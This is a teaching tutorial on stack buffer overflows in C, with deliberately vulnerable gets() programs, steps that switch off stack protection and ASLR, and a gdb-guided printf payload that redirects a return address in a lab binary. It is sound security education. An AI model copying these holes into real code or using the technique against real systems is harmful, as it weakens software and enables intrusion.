# Buffer Overflow

A **buffer** is a temporary space in memory used to hold data.

A **Buffer Overflow** happens when data written to a buffer is larger than
the size of the buffer, and due to insufficient bounds checking it
overflows and overwrites adjacent memory locations.


## Setup
To analyze the stack usage, we have to **disable existing OS and compiler preventions**:

### GCC Stack Protector Options
https://mudongliang.github.io/2016/05/24/stack-protector.html

* **-fstack-protector**\
    Emit extra code to check for buffer overflows, such as stack smashing
    attacks. This is done by adding a guard variable to functions with
    vulnerable objects.
    This includes functions that call alloca, and functions with buffers
    larger than 8 bytes.
    The guards are initialized when a function is entered and then checked
    when the function exits.
    If a guard check fails, an error message is printed and the program exits.

* **-fno-stack-protector**
    Disable Stack Protector Check

* **-z execstack**
    execstack is a program which sets, clears, or queries executable stack
    flag of ELF binaries and shared libraries.

In the `Makefile` of these examples, we use the following compiler flags:
```
CFLAGS = -ggdb -fno-stack-protector -z execstack -Wall
```

### Disable Address Space Layout Randomization (ASLR)
https://en.wikipedia.org/wiki/Address_space_layout_randomization

Address space randomization hinders some types of security attacks by making
it more difficult for an attacker to predict target addresses.
For example, attackers trying to execute return-to-libc attacks must locate
the code to be executed, while other attackers trying to execute shellcode
injected on the stack have to find the stack first.
In both cases, the system obscures related memory-addresses from the attackers.
These values have to be guessed, and a mistaken guess is not usually recoverable
due to the application crashing.

_Example_: Turn off ASLR
```
# su 
root66
# echo 0 > /proc/sys/kernel/randomize_va_space
# cat /proc/self/maps
```

## Buffer Overflow Attack: Overwrite Local Variables 

In the following C code, we can see a `buffer` array which can store a maximum of
8 characters together with a local integer variable `flag` which is used to influence
the control flow. 

In particular, this example uses the **vulnerable `gets()` function** to read any number of 
characters from the console and write it into the limited buffer array.

```C
void read_line()
{
    int flag = 0x0;
    char buffer[8];
    
    gets(buffer);

    if(flag == 0x0)
    {
        printf("Access rejected!!\n");
    }
    else
    {
        printf("Access permited!!\n");
    }
}

int main(int argc, char** argv)
{
    read_line();

    return 0;
}
```

_Example_: Enter a string that fits into the buffer (regular usage)
```
$ ./overwrite_local_vars 
AAAAAAA             // 8 times
Access rejected!!
```

_Example_: Enter a string that does not fit into the buffer (buffer overflow) 
```
$ ./overwrite_local_vars 
AAAAAAAAA           // 9 times
Access permited!!
```
In this case, the characters a written beyond the buffer and override another local variable named `flag`. 
As a result of this, `flag` now has a value different from `0x00` and so the `else` path will be executed.

## Buffer Overflow Attack: Overwrite the Return Address

In the following C code, again the **vulnerable gets() function** is used to write
unvalidated user data into a limited buffer.

```C
void attack()
{
    printf("attacker's code is executed!!\n");
    exit(0);
}

void get_input()
{   
    char buffer[8];
 
    gets(buffer);
    puts(buffer);
}

int main(int argc, char** argv)
{
    get_input();

    return 0;
}
```

In this attack we try to override the return address of the get_input() function's stackframe. 

_Example_: Enter a string that overrides the return address (buffer overflow) 
```
$ ./overwrite_local_vars 
AAAAAAAAAAAAAAAAAAAA    // 20 times           

AAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Becuase we have replaced the return address with 'A' characters wie end up in a **Segmentation Fault**
as soon as the `get_input()` terminates and returns to this invalid address.

_Example_: Enter a string that replaces the return address (buffer overflow) 
Using the **gdb**, we can we can find out the **address of the attack() function** which is part of the C
application.
```
$ gdb ./overwrite_return_addr
(gdb) run
AAAAA
AAAAA
[Inferior 1 (process 62824) exited normally]

(gdb) disass attack 
Dump of assembler code for function attack:
   0x0000555555555155 <+0>:     push   rbp
   0x0000555555555156 <+1>:     mov    rbp,rsp
   0x0000555555555159 <+4>:     lea    rdi,[rip+0xea4]        # 0x555555556004
   0x0000555555555160 <+11>:    call   0x555555555030 <puts@plt>
   0x0000555555555165 <+16>:    mov    edi,0x0
   0x000055555555516a <+21>:    call   0x555555555050 <exit@plt>
```
Now we know that the `attack()` funktion starts at address `0x0000555555555155` in memory.
Thus, we can encode this address into the user string (note that we use a little endian architecture).
```
0x 00 00 55 55 55 55 51 55 => \x55\x51\x55\x55\x55\x55\x00\x00 

$ printf "AAAAAAAAAAAAAAAA\x55\x51\x55\x55\x55\x55\x00\x00" | ./overwrite_return_addr
AAAAAAAAAAAAAAAAUQUUUU
attacker's code is executed!!
```
This `printf()` command creates an input string which exactly replaces the return address of
the `get_input()` stack frame with the address of the `attack()` funktion.
Thus, when `get_input()` returns, the instruction pointer is loaded with the injected address 
and the execution continues with the `attack()` funktion. 

Note that in a real buffer overflow attack, the user data would contain a **shellcode** which
will be executed by pointing the return address to it.

## References
* Jon Erickson. **Hacking - The Art of Exploitation**. No Starch Press, 2nd Edition, 2008
* Daniel Regalado, Shon Harris, Allen Harper, Chris Eagle, Jonathan Ness, Branko Spasojevic, Ryan Linn, Stephen Sims. **Gray Hat Hacking**. McGraw Hill Education, 4th Edition, 2015


*Egon Teiniker, 2020 - 2022, GPL v3.0*